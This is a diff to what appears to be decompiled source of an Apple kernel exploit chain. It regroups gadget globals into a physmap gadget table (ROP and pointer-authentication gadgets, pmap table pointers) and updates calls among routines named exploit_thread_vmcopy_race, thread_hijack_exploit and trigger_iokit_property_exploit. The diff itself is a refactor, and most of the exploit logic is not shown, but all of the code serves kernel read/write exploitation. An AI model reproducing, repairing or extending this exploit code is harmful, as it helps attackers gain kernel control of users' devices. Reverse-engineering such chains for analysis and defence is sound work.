@@ -1802,6 +1802,7 @@ static const uint32_t kIOSurfaceIdToTaskVmInfoIndex[27] = {
 static const uint32_t kLegacyIokitSlotTypes[10] = { 17, 4, 3, 6, 7, 5, 40, 20, 2, 42 };
 static const uint32_t kHashDigestSizes[4] = { 20, 32, 20, 48 };
 static struct iokit_notify_dispatch_gadgets gIokitNotifyDispatchGadgets;
+static struct physmap_gadget_table gPhysmapGadgets;
 
 #define qword_48000 gIokitNotifyDispatchGadgets.notificationSelector
 #define qword_48008 gIokitNotifyDispatchGadgets.taskPortIpcKobjectOffset
@@ -1812,6 +1813,40 @@ static struct iokit_notify_dispatch_gadgets gIokitNotifyDispatchGadgets;
 #define qword_48030 gIokitNotifyDispatchGadgets.threadStateHelper
 #define qword_48038 gIokitNotifyDispatchGadgets.pageInfoHelper
 #define qword_48040 gIokitNotifyDispatchGadgets.pacgaStoreRet
+#define word_48048 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[0])
+#define word_4804A (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[1])
+#define word_4804C (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[2])
+#define word_4804E (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[3])
+#define word_48050 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[4])
+#define word_48052 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[5])
+#define word_48054 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[6])
+#define word_48056 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[7])
+#define word_48058 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[8])
+#define word_4805A (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[9])
+#define word_4805C (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[10])
+#define word_4805E (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[11])
+#define word_48060 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[12])
+#define word_48062 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[13])
+#define word_48064 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[14])
+#define word_48066 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[15])
+#define word_48068 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[16])
+#define word_4806A (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[17])
+#define word_4806C (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[18])
+#define word_4806E (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[19])
+#define word_48070 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[20])
+#define word_48072 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[21])
+#define qword_48078 gPhysmapGadgets.ldrX0Ret
+#define qword_48080 gPhysmapGadgets.movX15BrX17
+#define qword_48088 gPhysmapGadgets.movX15BrX21
+#define qword_48090 gPhysmapGadgets.mrsSpselRet
+#define qword_48098 gPhysmapGadgets.strPacibspX1Ret
+#define qword_480A0 gPhysmapGadgets.pacizaStrX2Ret
+#define qword_480A8 gPhysmapGadgets.movX0Ret
+#define qword_480B0 gPhysmapGadgets.movX0X19Ret
+#define qword_480B8 gPhysmapGadgets.adrDataRef
+#define qword_480C0 gPhysmapGadgets.jumpTarget
+#define qword_480C8 gPhysmapGadgets.vmPageArray
+#define qword_480D0 gPhysmapGadgets.pmapTteTable
 
 #define SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(dst) \
   do { \
@@ -1991,40 +2026,6 @@ __int64 (__fastcall *off_448E0[7])() =
 }; // weak
 _UNKNOWN unk_44918; // weak
 _UNKNOWN unk_44938; // weak
-__int16 word_48048; // weak
-__int16 word_4804A; // weak
-__int16 word_4804C; // weak
-__int16 word_4804E; // weak
-__int16 word_48050; // weak
-__int16 word_48052; // weak
-__int16 word_48054; // weak
-__int16 word_48056; // weak
-__int16 word_48058; // weak
-__int16 word_4805A; // weak
-__int16 word_4805C; // weak
-__int16 word_4805E; // weak
-__int16 word_48060; // weak
-__int16 word_48062; // weak
-__int16 word_48064; // weak
-__int16 word_48066; // weak
-__int16 word_48068; // weak
-__int16 word_4806A; // weak
-__int16 word_4806C; // weak
-__int16 word_4806E; // weak
-__int16 word_48070; // weak
-__int16 word_48072; // weak
-__int64 qword_48078; // weak
-__int64 qword_48080; // weak
-__int64 qword_48088; // weak
-__int64 qword_48090; // weak
-__int64 qword_48098; // weak
-__int64 qword_480A0; // weak
-__int64 qword_480A8; // weak
-__int64 qword_480B0; // weak
-__int64 qword_480B8; // weak
-__int64 qword_480C0; // weak
-__int64 qword_480C8; // weak
-__int64 qword_480D0; // weak
 __int64 qword_480D8; // weak
 uint8_t algn_480E0[32]; // weak
 // extern const CFAllocatorRef kCFAllocatorDefault;
@@ -5833,7 +5834,7 @@ __int64 __fastcall iogpu_kernel_read_op(struct_krwCtx *krwCtx, unsigned __int64 
         if ( !(unsigned int)init_text_exec_data_const_sections(v30) && !(unsigned int)setup_iokit_notify_dispatch(&qword_48000, v30) )
         {
           if ( (unsigned int)exploit_thread_vmcopy_race((__int64)v34)
-            || (unsigned int)krw_ctx_setup_physmap((__int64)&word_48048, v30, (__int64)kernelScanCtx)
+            || (unsigned int)krw_ctx_setup_physmap((__int64)&gPhysmapGadgets, v30, (__int64)kernelScanCtx)
             || (v28[0] = kernelScanCtx, v28[1] = v34, v29 = 0, (unsigned int)thread_hijack_exploit((__int64)v28)) )
           {
             get_ppnum_via_kread((__int64)v34);
@@ -5945,7 +5946,6 @@ LABEL_27:
 // BA54: variable 'v17' is possibly undefined
 // BA88: variable 'v23' is possibly undefined
 // 448E0: using guessed type __int64 (__fastcall *off_448E0[7])();
-// 48048: using guessed type __int16 word_48048;
 // 480D8: using guessed type __int64 qword_480D8;
 
 //----- (000000000000BB3C) ----------------------------------------------------
@@ -17725,31 +17725,6 @@ __int64 __fastcall necp_set_opt_string_2(__int64 a1, __int64 a2)
 // 18: using guessed type int;
 // 1C: using guessed type int;
 // 20: using guessed type segment_command_64 stru_20;
-// 48048: using guessed type __int16 word_48048;
-// 4804A: using guessed type __int16 word_4804A;
-// 4804C: using guessed type __int16 word_4804C;
-// 4804E: using guessed type __int16 word_4804E;
-// 48050: using guessed type __int16 word_48050;
-// 48052: using guessed type __int16 word_48052;
-// 48054: using guessed type __int16 word_48054;
-// 48056: using guessed type __int16 word_48056;
-// 48058: using guessed type __int16 word_48058;
-// 4805A: using guessed type __int16 word_4805A;
-// 4805C: using guessed type __int16 word_4805C;
-// 4805E: using guessed type __int16 word_4805E;
-// 48060: using guessed type __int16 word_48060;
-// 48062: using guessed type __int16 word_48062;
-// 48064: using guessed type __int16 word_48064;
-// 48066: using guessed type __int16 word_48066;
-// 48068: using guessed type __int16 word_48068;
-// 4806A: using guessed type __int16 word_4806A;
-// 4806C: using guessed type __int16 word_4806C;
-// 4806E: using guessed type __int16 word_4806E;
-// 48070: using guessed type __int16 word_48070;
-// 48072: using guessed type __int16 word_48072;
-// 48078: using guessed type __int64 qword_48078;
-// 480A0: using guessed type __int64 qword_480A0;
-// 480B0: using guessed type __int64 qword_480B0;
 
 //----- (000000000001B158) ----------------------------------------------------
 __int64 __fastcall write_task_kobject_fields(__int64 a1, __int64 a2)
@@ -17784,7 +17759,6 @@ __int64 __fastcall write_task_kobject_fields(__int64 a1, __int64 a2)
   *(uint32_t *)a2 = 0;
   return result;
 }
-// 480A8: using guessed type __int64 qword_480A8;
 
 //----- (000000000001B280) ----------------------------------------------------
 __int64 __fastcall trigger_iokit_property_exploit(__int64 a1)
@@ -17805,8 +17779,6 @@ __int64 __fastcall trigger_iokit_property_exploit(__int64 a1)
   (*(void (__fastcall **)(uint64_t, __int64))(**(uint64_t **)(a1 + 8) + 48LL))(*(uint64_t *)(a1 + 8), 18);
   return (*(__int64 (__fastcall **)(uint64_t, __int64))(**(uint64_t **)(a1 + 8) + 48LL))(*(uint64_t *)(a1 + 8), 16);
 }
-// 480A0: using guessed type __int64 qword_480A0;
-// 480B0: using guessed type __int64 qword_480B0;
 
 //----- (000000000001B360) ----------------------------------------------------
 __int64 __fastcall wait_thread_ready(__int64 a1, uint64_t **a2)
@@ -18116,17 +18088,6 @@ __int64 __fastcall thread_hijack_exploit(__int64 a1)
   return 0;
 }
 // 20: using guessed type segment_command_64 stru_20;
-// 48080: using guessed type __int64 qword_48080;
-// 48088: using guessed type __int64 qword_48088;
-// 48090: using guessed type __int64 qword_48090;
-// 48098: using guessed type __int64 qword_48098;
-// 480A0: using guessed type __int64 qword_480A0;
-// 480A8: using guessed type __int64 qword_480A8;
-// 480B0: using guessed type __int64 qword_480B0;
-// 480B8: using guessed type __int64 qword_480B8;
-// 480C0: using guessed type __int64 qword_480C0;
-// 480C8: using guessed type __int64 qword_480C8;
-// 480D0: using guessed type __int64 qword_480D0;
 // 480D8: using guessed type __int64 qword_480D8;
 // 480E0: using guessed type uint8_t algn_480E0[32];
 
